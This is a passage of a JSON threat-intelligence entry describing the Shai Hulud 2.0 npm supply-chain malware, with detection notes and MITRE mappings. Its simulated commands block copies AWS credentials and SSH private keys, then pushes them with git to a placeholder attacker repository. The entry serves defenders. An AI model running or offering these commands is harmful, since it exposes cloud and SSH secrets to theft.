    }
  },
  "shortDescription": "NPM malware exfiltrating credentials via GitHub C2",
  "tags": [
    "Supply_Chain",
    "NPM",
    "Credential_Theft",
    "GitHub_C2",
    "JavaScript",
    "Exfiltration",
    "Initial_Access"
  ],
  "metadata": {
    "descriptionHtml": "<p><span style='color:#ef4444;font-weight:bold;'>Shai Hulud 2.0</span> is a sophisticated malware campaign targeting the JavaScript ecosystem. It involves publishing malicious npm packages (often typosquats) that execute a <span style='color:#ef4444;font-weight:bold;'>preinstall</span> or <span style='color:#ef4444;font-weight:bold;'>postinstall</span> script upon installation.</p><p>The malware typically targets:</p><ul><li>Cloud credentials (AWS, Azure, GCP)</li><li>SSH keys and Kubernetes configurations</li><li>CI/CD environment variables</li></ul><p><strong>Mechanism:</strong> Instead of a traditional C2 server, the malware uses an attacker-controlled <span style='color:#3b82f6;font-weight:bold;'>GitHub repository</span> as a 'Dead Drop Resolver'. It initializes a local git repo within the victim's temp folder, commits the stolen data, and pushes it upstream to the attacker's repository.</p>",
    "commandsBlock": "# Step 1: Attacker publishes malicious package\n$ npm publish @typosquat/package@1.0.0\n\n# Step 2: Victim installs the package\n$ npm install @typosquat/package\n\n# Step 3: Malicious script runs automatically (Simulation)\n$ node preinstall.js\n\n# Step 4: Malware harvests secrets (Simulation)\n$ cp ~/.aws/credentials /tmp/exfil/aws_creds\n$ cp ~/.ssh/id_rsa /tmp/exfil/id_rsa\n\n# Step 5: Malware exfiltrates via Git (The C2 mechanism)\n$ cd /tmp/exfil && git init\n$ git remote add origin [https://github.com/attacker/c2-repo.git](https://github.com/attacker/c2-repo.git)\n$ git push origin master",
    "prerequisites": [
      "Victim must have npm/yarn/pnpm installed",
      "Victim runs installation of the malicious package",
      "Outbound HTTPS access to GitHub.com allowed"
    ],
    "attackerGains": [
      "AWS/Cloud IAM credentials",
      "Private SSH keys for lateral movement",
      "Access to private source code repositories",
      "CI/CD pipeline secrets"
    ],
    "detectionNotes": [
      "Monitor for unexpected '.git' directory creation in temp folders",
      "Detect outbound git push traffic to unknown repositories",
      "Audit npm dependencies for typosquats or low reputation packages"
    ],
    "mitreCategories": [
      "T1195.001",
      "T1059.007",
      "T1552.001",
      "T1567.001"
    ],
    "extraInfo": [
      "Unit 42 Analysis - [https://unit42.paloaltonetworks.com/npm-supply-chain-attack/](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)",
      "Datadog Security Labs - [https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/](https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/)",
      "MITRE T1195.001 - Supply Chain Compromise",
      "MITRE T1567.001 - Exfiltration to Code Repository"
    ]
  },
